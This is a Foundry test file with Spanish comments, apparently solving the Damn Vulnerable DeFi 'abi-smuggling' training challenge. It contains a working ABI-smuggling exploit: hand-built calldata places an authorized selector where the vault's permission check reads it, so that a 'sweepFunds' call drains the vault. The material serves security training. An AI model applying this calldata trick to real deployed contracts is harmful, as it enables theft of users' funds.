// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

/*
 * NEXUS Offensive · training/dvd · reto "abi-smuggling"
 *
 * CLASE DE BUG: contrabando de ABI (el chequeo de permiso lee el selector en
 *   una posición FIJA de calldata, asumiendo dónde empieza `actionData`). Como
 *   `actionData` es dinámico, el atacante mueve su offset y coloca en la
 *   posición fija el selector AUTORIZADO (`withdraw`), mientras el dato que de
 *   verdad se ejecuta es `sweepFunds` (drena todo). El permiso valida uno y se
 *   ejecuta otro.
 *
 * FAMILIA: Control de acceso / autorización.
 *
 * INVARIANTE QUE LO ATRAPA (refuerza FL3 — autorización):
 *   La función ejecutada debe corresponder a un permiso real del llamante
 *   (selector autorizado == selector ejecutado). Se sostiene al inicio (un
 *   `sweepFunds` directo del player revierte NotAllowed) y se rompe con el
 *   contrabando (se ejecuta `sweepFunds` sin permiso para él).
 */
contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        vault = new SelfAuthorizedVault();
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);
        vm.stopPrank();
    }

    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes memory sweepData =
            abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, IERC20(address(token)));

        // INV al inicio: el player NO está autorizado a ejecutar sweepFunds.
        bytes memory honest = abi.encodeWithSelector(AuthorizedExecutor.execute.selector, address(vault), sweepData);
        (bool okHonest,) = address(vault).call(honest);
        assertFalse(okHonest, "INV debe sostenerse: sweepFunds directo no autorizado");

        // EXPLOIT: contrabando de ABI. Se mueve el offset de actionData a 0x80 y
        // se coloca el selector AUTORIZADO (withdraw, 0xd9caed12) en la posicion
        // fija (0x64) que lee el chequeo; el dato ejecutado es sweepFunds.
        bytes memory payload = abi.encodePacked(
            AuthorizedExecutor.execute.selector, // 0x00
            uint256(uint160(address(vault))), // 0x04  target
            uint256(0x80), // 0x24  offset de actionData
            uint256(0), // 0x44  relleno
            bytes4(0xd9caed12), // 0x64  selector AUTORIZADO (withdraw) que lee el chequeo
            bytes28(0),
            uint256(sweepData.length), // 0x84  longitud de actionData
            sweepData // 0xa4  calldata real: sweepFunds(recovery, token)
        );
        (bool ok,) = address(vault).call(payload);
        assertTrue(ok, "el contrabando deberia ejecutarse");

        // INV rota: se ejecutó sweepFunds sin permiso → el vault fue vaciado.
        console.log("recovery recibio (tokens):", token.balanceOf(recovery));
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
